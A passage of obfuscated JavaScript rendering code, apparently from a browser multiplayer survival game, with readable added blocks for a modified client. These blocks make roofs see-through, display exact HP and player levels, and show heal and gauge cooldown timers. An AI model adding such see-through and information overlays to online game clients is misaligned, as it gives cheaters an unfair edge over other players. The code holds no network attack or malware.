					if (ΔᐃᐃⲆ < ᐃⵠⵠⵠ) Δⵠᐃⵠᐃ(ᐃⵠⵠⵠ, ⲆⲆᐃᐃ)
				}
				var ⲆⲆᐃᐃ = ΔⵠⵠⲆ.ᐃᐃⵠⵠᐃⵠⵠ;
				if (ⵠⲆᐃⵠ < ᐃᐃΔ.ᐃΔᐃΔ.ΔΔΔⲆᐃ) {
					ⲆⲆᐃᐃ.ΔᐃΔⵠ(Δ);
					var ᐃⵠⵠⵠ = ᐃᐃΔ.ᐃΔᐃΔ.ΔΔΔⲆᐃ;
					1 < ᐃⵠⵠⵠ && Δⵠᐃⵠᐃ(ᐃⵠⵠⵠ, ⲆⲆᐃᐃ)
				}
			}
		}
		var ΔᐃΔⵠⵠΔᐃ = [];

		function ΔΔⲆⲆΔⲆⲆᐃⲆ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠᐃⲆᐃ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ⲆᐃᐃⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ⲆⵠⵠᐃᐃⵠΔΔⲆ(ᐃΔ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == false) this.Δᐃⵠ.ⵠⲆᐃ = ⵠᐃⵠᐃᐃ;
				var ΔᐃΔ = ᐃ * (600 * (ᐃⵠᐃᐃ * (1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ)));
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = ΔΔⵠ;
				var ⲆⵠⲆ = 0
			}
			var ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ΔⲆΔΔΔ + Δⵠ, -ⵠⵠᐃ / 2 + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function Ⲇᐃⵠⵠⵠᐃᐃⵠᐃ() {
			var ⵠΔΔⲆ = ᐃᐃΔ.ⵠΔΔⲆ;
			if (ⵠΔΔⲆ.ⲆΔΔⲆⲆ) {
				var ᐃᐃᐃΔ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
				Δ.save();
				Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + ᐃᐃᐃΔ.x, ᐃᐃΔ.ⲆΔΔ.y + ᐃᐃᐃΔ.y);
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⲆΔΔⵠΔⵠ];
				var Δⵠ = -ᐃⵠ.width / 2;
				var ⲆⵠⲆ = -ᐃⵠ.height / 2 - ᐃ * 125;
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⲆⵠⲆ);
				Δ.beginPath();
				Δ.lineWidth = ᐃ * 5;
				Δ.strokeStyle = Ⲇ.ⲆΔⵠⲆᐃΔⵠ[ⲆⲆⲆ.time];
				Δ.lineCap = ⵠ[5];
				Δ.arc(0, ⲆⵠⲆ + ᐃⵠ.height / ΔⵠᐃⲆ, ᐃ * 25, ⵠⲆᐃⵠ, Math.PI * 2 * ⵠΔΔⲆ.timeout.ΔᐃΔ);
				Δ.stroke();
				Δ.restore()
			}
		}

		function ᐃⵠⵠⲆⵠⲆΔΔᐃ() { // leaderboard
			var ᐃΔΔⲆⵠ = ᐃᐃΔ.ᐃΔΔⲆⵠ;
			var ᐃΔⵠⲆΔⵠⵠ = ΔⵠⵠⲆ.ⲆⲆⵠΔᐃ;
			if (ᐃΔΔⲆⵠ.ⵠⲆᐃ) {
				ᐃΔΔⲆⵠ.ⵠⲆᐃ = ⵠᐃⵠᐃᐃ;
				var ⲆⵠⲆΔⵠ = ᐃΔΔⲆⵠ.ⲆⵠⲆΔⵠ;
				var ᐃⵠⵠ = ᐃΔⵠⲆΔⵠⵠ.Ⲇⵠ.width;
				var ⵠⵠᐃ = ᐃΔⵠⲆΔⵠⵠ.Ⲇⵠ.height;
				var ⲆⵠⵠΔⵠⵠⵠ = ᐃΔⵠⲆΔⵠⵠ.Δ;
				var ᐃᐃᐃⵠ = ⲆⲆⲆ.ᐃᐃᐃⵠ;
				var ΔᐃΔᐃΔΔᐃ = ⵠΔⲆⲆⲆ;
				ⲆⵠⵠΔⵠⵠⵠ.clearRect(ⲆΔⵠ, ΔⲆⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
				ⲆⵠⵠΔⵠⵠⵠ.drawImage(ᐃΔⵠⲆΔⵠⵠ.ᐃⵠ, ᐃⵠΔ, 0);
				for (var ⵠᐃ = 0; ⵠᐃ < ⲆⵠⲆΔⵠ.length; ⵠᐃ++) {
					var ᐃⲆⲆ = ᐃᐃᐃⵠ[ⲆⵠⲆΔⵠ[ⵠᐃ]];
					if (ΔᐃᐃΔ.ΔⵠⲆᐃⵠΔⵠ === ⲆⲆⲆ.mode && ⵠ[575] === ᐃⲆⲆ.ⵠΔⵠⲆᐃ) continue;
					if (ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ && ΔᐃᐃΔ.ⲆᐃⵠΔᐃⲆΔ === ᐃⲆⲆ.ⲆⵠⲆᐃ) continue;
					if (ⲆⵠⲆΔⵠ[ⵠᐃ] == ᐃᐃΔ.id) {
						ΔᐃΔᐃΔΔᐃ = true;
						ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⲆⵠΔⵠᐃ && ΔᐃᐃΔ.ⵠΔⵠΔᐃⵠⲆ === ᐃⲆⲆ.ⲆⵠⲆᐃ ? Ⲇᐃ = "#FF0000" : Ⲇᐃ = ⵠ[253]
					} else {
						ΔᐃᐃΔ.ⲆⵠΔⵠᐃ === ⲆⲆⲆ.mode && ΔᐃᐃΔ.ⵠΔⵠΔᐃⵠⲆ === ᐃⲆⲆ.ⲆⵠⲆᐃ ? Ⲇᐃ = "#990000" : Ⲇᐃ = "#A1BDCD"
					}
					ⲆⵠⵠΔⵠⵠⵠ.drawImage(ᐃᐃΔΔᐃ(ᐃ, "" + (ⵠᐃ + ΔⵠⲆΔ), ᐃ * 15, Ⲇᐃ), ⲆᐃᐃΔΔ * ᐃ, (40 + ⵠᐃ * 22) * ᐃ);
					if (Settings.ShowLevel.enabled) {
					!ᐃⲆⲆ.ⲆⵠᐃⲆΔⵠⵠ && (ᐃⲆⲆ.ⲆⵠᐃⲆΔⵠⵠ = ᐃᐃΔΔᐃ(ᐃ, ᐃⲆⲆ.ⵠΔⵠⲆᐃ + ` [${ᐃⲆⲆ.level}]` , ᐃ * 15, Ⲇᐃ, ᐃᐃⵠⵠΔ, undefined, undefined, ⲆΔᐃᐃᐃ, 110 * ᐃ));
					} else {
						(ᐃⲆⲆ.ⲆⵠᐃⲆΔⵠⵠ = ᐃᐃΔΔᐃ(ᐃ, ᐃⲆⲆ.ⵠΔⵠⲆᐃ, ᐃ * 15, Ⲇᐃ, ᐃᐃⵠⵠΔ, undefined, undefined, ⲆΔᐃᐃᐃ, 110 * ᐃ));
					}
					ⲆⵠⵠΔⵠⵠⵠ.drawImage(ᐃⲆⲆ.ⲆⵠᐃⲆΔⵠⵠ, ᐃ * 39, (40 + ⵠᐃ * 22) * ᐃ);
					ⲆⵠⵠΔⵠⵠⵠ.drawImage(ᐃᐃΔΔᐃ(ᐃ, ΔΔⲆᐃ.ⵠΔΔⲆⵠΔΔ(ᐃⲆⲆ.ᐃⵠᐃⵠⵠ), ᐃ * 15, Ⲇᐃ), 156 * ᐃ, (40 + ⵠᐃ * 22) * ᐃ)
				}
				if (!ΔᐃΔᐃΔΔᐃ) {
					(ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⵠⵠⵠⵠⲆ || ΔᐃᐃΔ.ⲆⵠΔⵠᐃ === ⲆⲆⲆ.mode || ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ || ΔᐃᐃΔ.ⲆⵠⲆⵠᐃⲆΔ === ⲆⲆⲆ.mode || ΔᐃᐃΔ.ⵠⵠⲆⲆⲆ === ⲆⲆⲆ.mode || ΔᐃᐃΔ.ΔⵠⲆᐃⵠΔⵠ === ⲆⲆⲆ.mode && !ᐃᐃΔ.ⲆΔⵠΔⲆⵠⲆ || ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ && !ᐃᐃΔ.ⵠⵠⲆⵠⵠ) && (ⲆⵠⵠΔⵠⵠⵠ.drawImage(ⵠⲆ[Ⲇ.ᐃΔⵠΔΔᐃⵠ], ᐃΔⲆᐃᐃΔᐃ * ᐃ, (46 + ⵠᐃ * 22) * ᐃ), ⲆⵠⵠΔⵠⵠⵠ.drawImage(ᐃᐃΔΔᐃ(ᐃ, ΔΔⲆᐃ.ⵠΔΔⲆⵠΔΔ(ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃᐃΔ.id].ᐃⵠᐃⵠⵠ), ᐃ * ᐃΔⲆᐃᐃΔᐃ, ⵠ[253]), ᐃ * ΔΔᐃⵠᐃ, ᐃ * (46 + 22 * ⵠᐃ)))
				}
			}
			ΔⲆΔⵠ(Δ, ᐃΔⵠⲆΔⵠⵠ.Ⲇⵠ, ᐃΔⵠⲆΔⵠⵠ.translate.x, ᐃΔⵠⲆΔⵠⵠ.translate.y)
		}

		function ᐃⵠᐃΔᐃⵠⲆᐃⵠ() {
			var ⲆΔᐃⲆ = ⲆⲆⲆ.ⲆΔΔΔⵠ;
			var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠΔᐃⲆⲆᐃ][ⲆⲆⲆ.time];
			ΔⲆΔⵠ(Δ, ᐃⵠ, ⲆΔᐃⲆ.translate.x, ⲆΔᐃⲆ.translate.y);
			Δ.save();
			Δ.translate(ⲆΔᐃⲆ.translate.x + ᐃⵠ.width / 2, ⲆΔᐃⲆ.translate.y + ᐃⵠ.height / ⵠΔⲆᐃ);
			ⲆⲆⲆ.ⲆΔΔΔⵠ.now = ((new Date).getTime() - ⲆΔᐃⲆ.ⲆⲆⲆΔⵠ + ⲆΔᐃⲆ.ᐃⲆⲆΔΔ) % ΔᐃᐃΔ.ⲆⵠΔ;
			var ⲆᐃΔ = ⲆⲆⲆ.ⲆΔΔΔⵠ.now * (Ⲇⵠⵠᐃ * Math.PI) / ΔᐃᐃΔ.ⲆⵠΔ - Math.PI / ΔⵠᐃⲆ;
			Δ.rotate(ⲆᐃΔ);
			ΔⲆΔⵠ(Δ, ⵠⲆ[Ⲇ.ᐃᐃⲆⲆⲆⲆⵠ], -ᐃⵠ.width / 2, -ᐃⵠ.height / 2);
			Δ.restore()
		}

		function ᐃⵠᐃⵠⲆΔᐃᐃⵠ(ᐃΔ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && ⵠΔⲆⲆⲆ == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ && (this.Δᐃⵠ.ⵠⲆᐃ = ΔᐃⵠᐃⲆ);
				var ΔᐃΔ = 600 * (ᐃⵠᐃᐃ * (1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ)) * ᐃ;
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = ΔΔⵠⵠ;
				var ⲆⵠⲆ = ΔⲆⵠⲆ
			}
			var ΔⲆΔᐃⲆ = ⵠⲆ[Ⲇ.ⲆⲆⵠⲆⵠⲆᐃ].length;
			ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⲆⵠⲆⵠⲆᐃ][(this.ᐃⵠᐃⵠ + this.ⵠᐃ % ΔⲆΔΔΔ) % ΔⲆΔᐃⲆ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height;
			var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
			if (Settings.Roofs.enabled) {
				this.opacity = Settings.RoofsOpacity
			} else if (ᐃⲆⲆ && (this.ⲆⵠⵠΔ === ᐃᐃΔ.id || ᐃᐃΔ.ⵠᐃⲆΔΔΔΔ(this.ⲆⵠⵠΔ))) {
				if (550 > ΔΔⲆᐃ.ᐃⵠⵠᐃ(this, ᐃⲆⲆ)) this.opacity = Math.max(this.opacity - ᐃⵠᐃᐃ, .3);
				else this.opacity = Math.min(this.opacity + ᐃⵠᐃᐃ, ⵠΔᐃ)
			} else if (ᐃⲆⲆ && ΔΔⲆᐃ.ᐃⵠⵠᐃ(this, ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ]) < 150) this.opacity = Math.max(this.opacity - ᐃⵠᐃᐃ, .3);
			else this.opacity = Math.min(this.opacity + ᐃⵠᐃᐃ, 1);
			var ΔᐃⵠⵠⵠⵠᐃΔⲆ = Δ.globalAlpha;
			Δ.globalAlpha *= this.opacity;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2 + Δⵠ, -ⵠⵠᐃ / Δᐃⵠⵠ + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.globalAlpha = ΔᐃⵠⵠⵠⵠᐃΔⲆ;
			Δ.restore()
		}

		function ΔⲆⵠⲆᐃᐃⵠᐃᐃ() {
			var ᐃⲆⲆⵠᐃ = ᐃᐃΔ.ᐃⲆⲆⵠᐃ;
			if (ᐃⲆⲆⵠᐃ.wait) {
				var ΔΔᐃΔⵠ = ᐃⲆⲆⵠᐃ.timeout.ⵠⲆᐃ();
				Δ.save();
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⵠⵠΔΔΔⵠ];
				Δ.translate(ᐃⵠ.width - 12 * ᐃ, ΔⵠⵠⲆ.ⲆΔⲆⵠ.translate.y - ᐃ * 190);
				var Δⵠ = -ᐃⵠ.width / ΔⲆΔΔΔ + 9;
				var ⲆⵠⲆ = -ᐃⵠ.height / ⲆᐃᐃⲆ - ⲆⵠᐃⲆ;
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⲆⵠⲆ);
				Δ.beginPath();
				Δ.lineWidth = ᐃ * ⵠᐃⲆΔ;
				Δ.strokeStyle = Ⲇ.ⵠⵠⵠⵠⲆⵠΔ[ⲆⲆⲆ.time];
				Δ.lineCap = ⵠ[ᐃΔΔΔ];
				Δ.arc(ΔⲆᐃᐃⲆⵠᐃ, ⲆⵠⲆ + ᐃⵠ.height / 2, ᐃ * 25, ᐃⵠⲆ, 2 * Math.PI * ᐃⲆⲆⵠᐃ.timeout.ΔᐃΔ);
				Δ.stroke();
				Δ.restore();
				ΔΔᐃΔⵠ && (ᐃⲆⲆⵠᐃ.wait = ᐃᐃΔᐃΔ, ᐃⲆⲆⵠᐃ.timeout.ΔᐃΔ = ⵠⲆᐃⵠ, ᐃⲆⲆⵠᐃ.timeout.ᐃⲆΔ = false)
			}
		}

		function ⵠᐃⲆⵠⲆΔⲆΔᐃ() {
			Δ.save();
			var ⲆΔⲆⲆⲆᐃⵠ = ᐃ;
			if (ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠΔᐃⵠ.x < .25) Δ.globalAlpha = ᐃᐃΔ.ⲆΔⲆⵠ.ΔⵠⲆⲆᐃᐃⵠ.ΔᐃΔ;
			var ⲆⵠⲆ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ.length > 0 ? -70 : 0;
			(ᐃᐃΔ.ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] || ᐃᐃΔ.ΔⲆᐃⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⵠⲆⲆᐃ) != -ΔⵠΔⵠ || ᐃᐃΔ.ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && -1 != ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⵠⲆⲆⲆⵠ) || ᐃᐃΔ.ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⵠⲆⲆᐃ) != -ⵠΔΔ || ᐃᐃΔ.Ⲇⵠⵠⵠⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && -1 != ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ΔⵠⵠⵠΔ) || ᐃᐃΔ.ᐃΔᐃΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && (ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⵠⲆⲆᐃ) != -ᐃᐃⵠ || ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃ.ⵠᐃⲆⵠᐃ) != -1)) && (ⲆⵠⲆ -= ᐃ * 50);
			Δ.translate((ΔΔΔᐃ - ᐃ * 950) / 2, ⲆⵠⲆ);
			Δ.fillStyle = "#69A148";
			Δ.fillRect(this.translate.x + 37 * ᐃ, this.translate.y + ᐃ * ⲆᐃᐃⲆΔ, ᐃ * (ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠΔᐃⵠ.x * 178), ᐃ * ᐃᐃΔᐃⲆⵠᐃ);
			Δ.globalAlpha = ᐃΔᐃⲆ;
			ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠⵠⵠΔⵠᐃ.x < .35 && (Δ.fillStyle = "#8F050A", Δ.globalAlpha = ᐃᐃΔ.ⲆΔⲆⵠ.ⵠᐃⵠΔᐃᐃⲆ.ΔᐃΔ, Δ.fillRect(this.translate.x + 277 * ᐃ, this.translate.y + ᐃ * 17, 178 * ᐃ, ᐃ * 18), Δ.globalAlpha = 1);
			const ctx = Δ;
			const scale = ᐃ;
			if (Settings.ShowHP.enabled) {
				ctx.save();
				ctx.lineWidth = 7;
				ctx.font = "34px Baloo Paaji";
				ctx.fillStyle = "red";
				ctx.strokeStyle = "black";
				ctx.strokeText(Math.round(ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠΔᐃⵠ.x * 200) + "hp", this.translate.x - 80 * scale, this.translate.y + 35 * scale);
				ctx.fillText(Math.round(ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠΔᐃⵠ.x * 200) + "hp", this.translate.x - 80 * scale, this.translate.y + 35 * scale);
				ctx.restore()
			}
			if (Settings.Timers.enabled) {
				ctx.save();
				ctx.lineWidth = 7;
				ctx.font = "34px Baloo Paaji";
				ctx.strokeStyle = "black";
				ctx.fillStyle = "red";
				ctx.strokeText(~~(11 - (Date.now() - Timers.HealTimer) / 1e3) + "s", this.translate.x + 216 * scale, this.translate.y + 35 * scale);
				ctx.fillText(~~(11 - (Date.now() - Timers.HealTimer) / 1e3) + "s", this.translate.x + 216 * scale, this.translate.y + 35 * scale);
				ctx.fillStyle = "red";
				ctx.strokeText(~~(6 - (Date.now() - Timers.GaugeTimer) / 1e3) + "s", this.translate.x + 460 * scale, this.translate.y + 35 * scale);
				ctx.fillText(~~(6 - (Date.now() - Timers.GaugeTimer) / 1e3) + "s", this.translate.x + 460 * scale, this.translate.y + 35 * scale);
				ctx.restore()
			}
			Δ.fillStyle = "#AF352A";
			Δ.fillRect(this.translate.x + ᐃ * 277, this.translate.y + ΔⵠⲆᐃⵠⲆᐃ * ᐃ, ᐃ * (178 * ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠⵠⵠΔⵠᐃ.x), ᐃ * ⲆᐃΔⵠΔ);
			ᐃᐃΔ.ⲆΔⲆⵠ.ΔΔⲆⲆᐃ.x < .35 && (Δ.fillStyle = "#366B91", Δ.globalAlpha = ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⵠΔⲆⲆΔⲆ.ΔᐃΔ, Δ.fillRect(this.translate.x + 517 * ᐃ, this.translate.y + 17 * ᐃ, ᐃ * 178, 18 * ᐃ), Δ.globalAlpha = ΔⲆᐃᐃ);
			Δ.fillStyle = "#669BB1";
			Δ.fillRect(this.translate.x + 517 * ᐃ, this.translate.y + ⵠⲆᐃⵠⵠΔⵠ * ᐃ, ᐃᐃΔ.ⲆΔⲆⵠ.ΔΔⲆⲆᐃ.x * 178 * ᐃ, ΔΔⲆΔΔᐃᐃ * ᐃ);
			if (.99 < ᐃᐃΔ.ⲆΔⲆⵠ.ΔΔⲆⲆᐃ.x) {
				.35 > ᐃᐃΔ.ⲆΔⲆⵠ.ΔⵠⵠⲆⲆ.x && (Δ.fillStyle = "#6C4036", Δ.globalAlpha = ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠᐃⲆΔΔᐃ.ΔᐃΔ, Δ.fillRect(this.translate.x + 517 * ᐃ, this.translate.y + ⲆⵠᐃΔᐃ * ᐃ, ᐃ * 178, 18 * ᐃ), Δ.globalAlpha = ΔᐃᐃⲆ);
				Δ.fillStyle = "#9C4036";
				Δ.fillRect(this.translate.x + 517 * ᐃ, this.translate.y + ᐃ * ⵠᐃⵠⲆⲆ, ᐃ * ((1 - ᐃᐃΔ.ⲆΔⲆⵠ.ΔⵠⵠⲆⲆ.x) * 178), ᐃ * 18)
			}
			.35 > ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠⲆⲆΔⲆⵠ.x && (Δ.fillStyle = "#001A57", Δ.globalAlpha = ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⲆᐃⲆⲆⵠᐃ.ΔᐃΔ, Δ.fillRect(this.translate.x + ᐃ * 757, this.translate.y + ᐃ * ᐃⵠᐃⵠᐃⵠⲆ, 178 * ᐃ, ᐃ * 18), Δ.globalAlpha = ⵠΔⲆ);
			Δ.fillStyle = "#074A87";
			Δ.fillRect(this.translate.x + 757 * ᐃ, this.translate.y + 17 * ᐃ, ᐃ * (178 * ᐃᐃΔ.ⲆΔⲆⵠ.ᐃⵠⲆⲆΔⲆⵠ.x), ᐃⲆⲆⵠⵠΔΔ * ᐃ);
			ᐃ = ⲆΔⲆⲆⲆᐃⵠ;
			ΔⲆΔⵠ(Δ, this.ᐃⵠ, this.translate.x, this.translate.y);
			this.y = this.translate.y + ⲆⵠⲆ;
			Δ.restore();
			if (ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⵠΔⵠᐃⲆᐃ.x < .99) {
				var Δⵠ = Math.floor(Δᐃⵠᐃ - ⵠⲆ[Ⲇ.ⵠᐃⵠΔⲆᐃᐃ].width / ⵠΔⲆᐃ);
				ⲆⵠⲆ += this.translate.y - ⵠⲆ[Ⲇ.ⵠᐃⵠΔⲆᐃᐃ].height - 5 * ᐃ;
				Δ.fillStyle = "#BBE8EF";
				Δ.fillRect(Δⵠ + 5, ⲆⵠⲆ + 5 * ᐃ, ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⵠΔⵠᐃⲆᐃ.x * (ᐃ * 588), ᐃ * ⵠᐃⲆⲆΔ);
				if (ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⵠΔⵠᐃⲆᐃ.x < .35) {
					Δ.fillStyle = "#9BA8AF";
					Δ.globalAlpha = ᐃᐃΔ.ⲆΔⲆⵠ.ΔΔⵠⵠΔᐃΔ.ΔᐃΔ;
					Δ.fillRect(Δⵠ + 5, ⲆⵠⲆ + 5, ᐃ * 588, ⲆΔΔᐃᐃ * ᐃ);
					Δ.globalAlpha = ᐃᐃⲆΔ
				}
				ΔⲆΔⵠ(Δ, ⵠⲆ[Ⲇ.ⵠᐃⵠΔⲆᐃᐃ], Δⵠ, ⲆⵠⲆ);
				this.y = ⲆⵠⲆ
			}
		}

		function ΔΔᐃⵠΔⵠᐃⵠᐃ() {
			var ᐃᐃᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆⵠⵠⲆ];
			if (ΔᐃᐃΔ.ⵠⵠⵠⵠⲆ === ⲆⲆⲆ.mode || ΔᐃᐃΔ.ⵠⵠⲆⲆⲆ === ⲆⲆⲆ.mode || ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ === ⲆⲆⲆ.mode || ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ || ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⲆⵠⲆⵠᐃⲆΔ || ΔᐃᐃΔ.ᐃⲆΔⵠⵠ === ⲆⲆⲆ.mode || ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⲆⵠΔⵠᐃ) {
				for (var ⵠᐃ = Δⵠᐃ; ᐃᐃᐃⵠ.length > ⵠᐃ; ⵠᐃ++) {
					ᐃᐃᐃⵠ[ⵠᐃ].ⵠⲆᐃᐃᐃᐃⵠ()
				}
			} else if (ⲆⲆⲆ.mode === ΔᐃᐃΔ.ΔⵠⲆᐃⵠΔⵠ) {
				for (var ⵠᐃ = 0; ᐃᐃᐃⵠ.length > ⵠᐃ; ⵠᐃ++) {
					if (ᐃᐃΔ.ⲆΔⵠΔⲆⵠⲆ || ᐃᐃΔ.ᐃⵠⲆᐃⵠ.enabled) ᐃᐃᐃⵠ[ⵠᐃ].ⵠⲆᐃᐃᐃᐃⵠ();
					else ᐃᐃᐃⵠ[ⵠᐃ].ⵠΔⲆΔ.ⵠΔⵠⲆᐃ !== ⵠ[575] && ᐃᐃᐃⵠ[ⵠᐃ].ⵠⲆᐃᐃᐃᐃⵠ()
				}
			}
		}

		function ⵠᐃⲆΔΔⵠⲆⵠΔ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == ᐃⲆᐃⵠΔ) this.Δᐃⵠ.ⵠⲆᐃ = ⲆΔⲆᐃΔ;
				var ΔᐃΔ = (1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ * 600 * ᐃ;
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = Δⵠᐃ;
				var ⲆⵠⲆ = ᐃⵠⲆⵠ
			}
			ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠⵠᐃⵠ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2 + Δⵠ, -ⵠⵠᐃ / 2 + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.lock) {
				ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔΔⵠᐃ][ⲆⲆⲆ.time];
				ᐃⵠⵠ = -ᐃⵠ.width;
				ⵠⵠᐃ = -ᐃⵠ.height;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / Δⵠⵠⵠ + Δⵠ - ΔᐃⲆⵠ * ᐃ, -ⵠⵠᐃ / Ⲇᐃᐃⵠ + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ)
			}
			Δ.restore()
		}

		function ⵠᐃᐃΔΔᐃΔ(ᐃⵠΔᐃⵠ) {
			var ᐃⵠΔᐃⵠ = ᐃⵠΔᐃⵠ / 100;
			if (.8 < ᐃⵠΔᐃⵠ) return;
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == false && (this.Δᐃⵠ.ⵠⲆᐃ = ⲆᐃⵠⲆⵠ);
				var ΔᐃΔ = ᐃ * (600 * (ᐃⵠᐃᐃ * (ΔΔΔ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ)));
